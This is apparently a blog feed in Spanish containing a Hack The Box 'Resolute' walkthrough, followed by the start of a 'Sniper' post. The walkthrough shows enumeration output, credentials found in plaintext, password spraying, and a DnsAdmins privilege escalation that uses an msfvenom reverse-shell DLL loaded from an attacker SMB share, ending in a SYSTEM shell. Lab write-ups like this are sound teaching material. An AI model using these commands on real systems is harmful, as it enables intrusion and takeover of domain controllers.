Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;lf
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;tevie
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;laire
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;aulo
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;teve
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;nnette
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;nnika
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;er
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;laude
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;elanie
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\z&lt;/span&gt;ach
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;imon
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;aoki
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Contractors&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 1103&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;yan
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Enterprise Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Group Policy Creator Owners&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 520&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Controllers&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 516&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;ESOLUTE$
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Schema Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 518&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Computers&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 515&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;S02$
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 514&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 512&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator

 &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.169 via RID cycling &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RIDS: 500-550,1000-1050&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Couldn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting printer info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.169    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Mon Jan  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 16:32:54 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Enum4linux nos muestra la lista de grupos, usuarios, dominio, entre mucha otra informacion de interes, pero especificamente en la parte de usuarios nos muestra un comentario del usuario marko, el cual contiene un comentario en la descripcion y nos indica que la contraseña que le fue impuesta a este usuario es &lt;strong&gt;Welcome123!&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to Welcome123!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al intentar iniciar sesion o enumerar los SHARENAMES con smbmap y smbclient junto con las credenciales, no fue posible, utilizamos &lt;code&gt;evil-winrm&lt;/code&gt;, ya que el puerto 5985 de winrm esta abierto en la maquina para intentar ingresar en ese puerto, pero nos muestra un mensaje de error de Autenticacion.&lt;/p&gt;
&lt;h1 id=&#34;user---melanie&#34;&gt;User - Melanie&lt;/h1&gt;
&lt;p&gt;Sin descartar la contraseña que encontramos utilizamos un pequeño diccionario con los usuarios disponibles en la maquina y, junto a un pequeño script de bash y evil-winrm, intentar con cada usuario la contraseña &lt;strong&gt;Welcome123!&lt;/strong&gt;. Al hacer esto logramos que la usuario Melanie iniciara sesion satisfactoriamente en winrm, obteniendo asi una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_20-06-36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---ryan&#34;&gt;User - Ryan&lt;/h1&gt;
&lt;p&gt;Al ingresar a la maquina hicimos una enumeracion de archivos, en el dsco &lt;code&gt;C:/&lt;/code&gt; encontramos un archivo que contiene un log de ejecucion de comandos, entre los comandos vemos que se utilizó net use junto con un usuario y una contraseña que pertenecen a &lt;code&gt;ryan&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_20-10-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ryan:Serv3r4Admin4cc123!
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;privilege-escalation---abusing-dnsadmins&#34;&gt;PRIVILEGE ESCALATION - Abusing DNSAdmins&lt;/h1&gt;
&lt;p&gt;Utilizamos evil-winrm nuevamente para obtener una shell con el usuario ryan, enumeramos los grupos en los que el usuario se encuentra (Domain Users, Contractors).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_23-27-28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;whoami /groups&lt;/code&gt; nos da mejor informacion sobre este usuario, vemos que ryan pertenece a varios grupos, uno de ellos es &lt;code&gt;MEGABANK\DnsAdmins&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-06_23-29-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que ryan pertenece a DnsAdmins vamos a explotar sus privilegios para poder cargar un fichero DLL con privilegios de administrador en el Servidor de DNS que la maquina tiene corriendo.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html&#34;&gt;&lt;strong&gt;Abusing DNSAdmins&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Primero vamos a crear un archivo DLL con msfvenom para ejecutar una shell inversa hacia nuestra maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/x64/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; --platform&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;windows -f dll &amp;gt; revshell.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un servidor de SAMBA utilizando las herramientas de impacket y ponemos a la escucha netcat en nuestra maquina o de igual forma con metasploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python smbserver.py DLL .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que el servidor DNS esta corriendo sobre el Domain Controller (DC) podemos utilizar simplemente dnscmd para poder cargar el DLL.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dnscmd /config /serverlevelplugindll &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.15.105&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;LL&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;evshell.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Luego de ello vamos a parar e iniciar el servidor DNS nuevamente.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc.exe stop dns; sc.exe start dns
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Obtenemos una respuesta en nuestro servidor SMB y nuestra shell con privilegios de Administrador.&lt;/p&gt;
&lt;p&gt;SMB:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-07_19-03-15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una sesion en Metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/x64/shell_reverse_tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LHOST     10.10.15.105     yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   LPORT     &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target

msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.15.105:1339 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.15.105:1339 -&amp;gt; 10.10.10.169:52284&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-07 19:05:30 -0600



C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cambiamos a una shell de windows y leemos nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-07_19-04-19.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/resolute/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/resolute/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>enum4linux</category>
            
          
            
              <category>evil-winrm</category>
            
          
            
              <category>metasploit</category>
            
          
            
              <category>impacket</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Sniper</title>
        <link>https://sckull.github.io/posts/sniper/</link>
        <pubDate>Sat, 28 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 28 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/sniper/</guid>
        <description>Descubrimos una vulnerabilidad LFI/RFI en el blog donde ejecutamos una shell inversa utilizando una WebShell. Cambiamos al siguiente usuario utilizando PowerShell y credenciales almacenadas.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Descubrimos una vulnerabilidad LFI/RFI en el blog donde ejecutamos una shell inversa utilizando una WebShell. Cambiamos al siguiente usuario utilizando PowerShell y credenciales almacenadas. Creando un archivo CHM y tras ser ejecutado escalamos privilegios.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/211&#34;&gt;Sniper&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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